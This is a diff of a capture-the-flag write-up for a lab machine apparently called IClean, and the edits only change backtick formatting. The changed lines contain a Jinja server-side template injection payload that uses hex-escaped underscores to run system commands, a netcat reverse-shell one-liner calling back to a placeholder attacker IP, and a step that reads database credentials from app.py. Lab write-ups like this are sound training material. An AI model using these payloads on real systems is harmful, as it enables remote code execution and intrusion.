@@ -177,22 +177,23 @@ The number ``49`` appears ! There is a **SSTI** !
 ### SSTI exploitation
 
 For this part, we need to find the correct payload. After some tries, I found this one : 
-``{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}``
 
-The ``_`` character is encoded. It is a Unicode Hex Character.
+`{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}`
 
-Inject the payload and you can see that we can execute command as ``www-data`` : 
+The `_` character is encoded. It is a Unicode Hex Character.
+
+Inject the payload and you can see that we can execute command as `www-data` : 
 
 ![Command id](../assets/img/IClean/command.png)
 
-Setup a listener and get a reverse shell with ``rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR-IP} 1337 >/tmp/f`` : 
+Setup a listener and get a reverse shell with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR-IP} 1337 >/tmp/f` : 
 
 ![Reverse Shell](../assets/img/IClean/rev.png)
 
 
 ## User Flag
 
-There is a ``app.py`` file. Read its content with ``cat`` and you will find DB credentials : 
+There is a `app.py` file. Read its content with `cat` and you will find DB credentials : 
 ```bash
 # Database Configuration
 db_config = {
